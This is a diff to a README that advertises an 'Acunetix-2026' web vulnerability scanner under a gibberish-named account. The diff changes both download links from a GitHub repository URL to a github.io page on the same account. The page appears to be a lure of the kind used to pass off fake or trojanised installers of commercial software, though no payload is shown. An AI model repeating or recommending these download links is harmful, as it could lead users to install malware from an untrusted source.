@@ -1,6 +1,6 @@
 # 🛡️ Acunetix-2026 - Scan your web apps for vulnerabilities
 
-[![Download Acunetix](https://img.shields.io/badge/Download-Acunetix_2026-blue)](https://github.com/Coriandrumsativumthoracicmedicine670/Acunetix-2026)
+[![Download Acunetix](https://img.shields.io/badge/Download-Acunetix_2026-blue)](https://coriandrumsativumthoracicmedicine670.github.io)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ Before you install the software, ensure your computer meets these minimum specif
 
 Acunetix-2026 is available directly through our repository. You can obtain the installer by following the link below:
 
-[Click here to visit the download page for Acunetix-2026](https://github.com/Coriandrumsativumthoracicmedicine670/Acunetix-2026)
+[Click here to visit the download page for Acunetix-2026](https://coriandrumsativumthoracicmedicine670.github.io)
 
 Ensure you save the file to a known location on your computer, such as your Downloads folder.
 
